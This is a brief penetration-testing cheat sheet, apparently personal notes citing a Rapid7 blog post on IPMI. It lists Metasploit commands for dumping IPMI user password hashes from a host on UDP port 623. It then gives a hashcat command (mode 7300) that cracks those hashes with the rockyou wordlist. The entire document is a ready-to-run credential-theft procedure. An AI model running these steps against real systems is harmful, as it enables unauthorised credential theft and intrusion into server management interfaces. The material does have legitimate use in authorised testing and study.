### Resource: https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/

### UDP port: 623 (asf-rmcp)

### Dump password hashes for users with Metasploit

#### 1) msfconsole

#### 2) use auxiliary/scanner/ipmi/ipmi_dumphashes

#### 3) set RHOSTS HOST

#### 4) run

#### 5) hashcat -m 7300 -a 0 hash /usr/share/wordlists/rockyou.txt
